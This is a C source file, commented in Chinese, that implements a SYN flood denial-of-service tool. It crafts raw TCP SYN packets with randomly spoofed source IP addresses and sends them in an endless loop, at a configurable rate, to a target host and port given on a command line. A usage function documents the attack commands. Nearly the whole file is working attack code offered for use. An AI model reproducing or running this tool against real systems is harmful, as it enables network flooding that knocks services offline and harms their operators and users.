#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include <unistd.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

#include "print.h"
#include "syn_attack.h"

static int syn_sock_fd;           /* syn的原始套接字标识符 */
static char sock_exsit;           /* syn套接字是否建立 */         
static char flag_stop;            /* 停止syn攻击的标志 */
static char syn_pkt[TCP_PKT_LEN]; /* syn攻击包 */
static int syn_interval_ms = 10;  /* 每次syn攻击的时间间隔 */
struct iphdr* ip;                 /* ip头指针 */
struct tcphdr* tcp;               /* tcp头指针 */

/***************************************************************/
/* 函  数：sig_int **********************************************/
/* 说  明：SIGINT信号处理函数 *************************************/
/* 参  数：SIGINT信号值 ******************************************/
/* 返回值：无 ****************************************************/
/***************************************************************/
static void sig_int(int signum)
{
	flag_stop = 1;
	printf("\n");
	
	return;
}

/***************************************************************/
/* 函  数：syn_init *********************************************/
/* 说  明：初始化syn的一些参数 *************************************/
/* 参  数：无 ***************************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
static void syn_init()
{
	int on;
	char c;
	
	if(!sock_exsit)
	{
		syn_sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
		if(syn_sock_fd < 0)
		{
			print_errno("%s", "Failed to create syn attack socket!");
			return;
		}
		c = 0x45;
		on = 1;
		setsockopt(syn_sock_fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));/* 设置套接字的属性为自己构建IP头 */
		/* 初始化ip头部 */
		ip = (struct iphdr*)syn_pkt;
		memcpy(ip, &c, sizeof(c)); /* IP版本和包头长度 */ 
		ip->tos = 0;                         /* 服务类型 */ 
		ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr)); /* IP数据包长度, SYN包不包含用户数据*/ 
		ip->id = 0; 
		ip->frag_off = 0; 
		ip->ttl = MAXTTL;           /* TTL时间 */ 
		ip->protocol = IPPROTO_TCP; /* 协议为TCP */
		
		/* 初始化tcp头部 */
		tcp = (struct tcphdr*)(syn_pkt + sizeof(struct ip));
		tcp->ack_seq = 0; /* 不回应ack */ 
		tcp->doff = 5;    /* 保留位 */
		tcp->syn =1 ;     /* 数据类型为SYN请求 */
	}
	
	return;
}

/***************************************************************/
/* 函  数：syn_clear ********************************************/
/* 说  明：释放syn占用的系统资源 ***********************************/
/* 参  数：无 ***************************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
static void syn_clear()
{
	if(sock_exsit)
	{
		sock_exsit = 0;
		close(syn_sock_fd);
	}
	flag_stop = 0;
	signal(SIGINT, SIG_DFL);
	
	return;
}

/***************************************************************/
/* 函  数：check_sum ********************************************/
/* 说  明：计算校验和 *********************************************/
/* 参  数：buff 包的首地址 ****************************************/
/*        len 包的长度*******************************************/
/* 返回值：校验和 ************************************************/
/**************************************************************/
static unsigned short check_sum(char *buff, int len)
{
    unsigned short *mid;
    unsigned short te = 0;
    unsigned int sum;;
    
    mid = (unsigned short*)buff;
    sum = 0;
    while(len > 1)
    {
       sum += *mid++;
       len -= 2; 
    }
    
    /* 如果奇数个字节，将多出的一字节放入short类型的高位,低8位置0,加入到sum中 */ 	
    if(len == 1)
    {  
       te = *(unsigned char*)mid;
       te  = (te << 8) & 0xff;
       sum += te;                
    }
    sum = (sum >> 16) + (sum & 0xffff); 
    sum += sum >> 16;
    
    return (unsigned short)(~sum);
}

/***************************************************************/
/* 函  数：send_syn_packet **************************************/
/* 说  明：发送syn攻击包 ******************************************/
/* 参  数：addr sockaddr_in指针 **********************************/
/*        port 本机port *****************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
static void send_syn_packet(struct sockaddr_in * addr, unsigned short port)
{
	int ret;
	
	syn_init();
	ip->check = 0;                     /* 检验和，后面赋值 */ 
	ip->daddr = addr->sin_addr.s_addr; /* 目标主机IP */ 
	tcp->source = htons(port);         /* 本地发送端端口 */ 
	tcp->dest = addr->sin_port;        /* 目标主机端口 */ 
	tcp->seq= random();                /* 随机的序列号，打破三次捂手 */
	
	signal(SIGINT, sig_int);
	while(1)
	{
		if(flag_stop)
		{
			syn_clear();
			return;
		}
		ip->saddr = random(); 
		tcp->check = check_sum((char *)tcp, sizeof(struct tcphdr)); /* 计算校验和 */
		ret = sendto(syn_sock_fd, syn_pkt, sizeof(syn_pkt), 0, (struct sockaddr *)addr, sizeof(struct sockaddr));
		if(ret <= 0)
		{
			print_errno("Failed to send syn attack packet!\n"); 
			syn_clear();
			return;
		}
		usleep(syn_interval_ms * 1000);
	}
      
    return;    
}

/***************************************************************/
/* 函  数：syn_attack *******************************************/
/* 说  明：syn_attack的主程序 ************************************/
/* 参  数：target 目标ip或者主机名 ********************************/
/*      ：target_port 目标端口 **********************************/
/*      ：local_port  本地端口 **********************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void syn_attack(char *target, unsigned short target_port, unsigned short local_port)
{
	struct sockaddr_in addr; 
	struct hostent* host; 
	
	memset(&addr, 0, sizeof(addr)); 
	addr.sin_family = AF_INET;
	
	/* 获取IP地址的主机名，攻击使用第一个IP */
	if(inet_aton(target, &addr.sin_addr) == 0) 
	{ 
		host = gethostbyname(target);
		if(host == NULL)
		{ 
			printf("gethostbyname fail!\n");
			return;
		}
		addr.sin_addr = *(struct in_addr*)(host->h_addr_list[0]);
	}
	addr.sin_port = htons(target_port);
	
	send_syn_packet(&addr, local_port); /* 发送数据包 */
    
    return;
}

/***************************************************************/
/* 函  数：syn_reset ********************************************/
/* 说  明：恢复syn的一些默认参数 ***********************************/
/* 参  数：无 ***************************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void syn_reset()
{
	set_syn_interval_ms(10);
	
	return;
}

/***************************************************************/
/* 函  数：set_syn_interval_ms **********************************/
/* 说  明：设置syn攻击时间间隔 *************************************/
/* 参  数：interval_ms 时间间隔ms *********************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void set_syn_interval_ms(int interval_ms)
{
	if(interval_ms < 0)
	{
		printf("Patameter error!(%d)\n", interval_ms);
		return;
	}
	syn_interval_ms = interval_ms;
	printf("Default syn_interval was set to %d(ms)!\n", interval_ms);
	
	return;
}

/***************************************************************/
/* 函  数：syn_usage ********************************************/
/* 说  明：介绍syn使用方法 ****************************************/
/* 参  数：无 ***************************************************/
/* 返回值：无 ***************************************************/
/**************************************************************/
void syn_usage()
{
	printf("\n[Syn Usage]\n\n");
	printf("--\"syn [target ip or host name] [target port] [local port]\": Targets will be attacked by syn\n\n");
	printf("--\"syn set intvl [n]\": Setting syn attack speed.\n\n");
	printf("--\"syn reset\" :When you use this command, some parameters of syn will be restored.\n\n");
	printf("--\"syn help\":Show this explanation.\n\n");
	
	return;
}
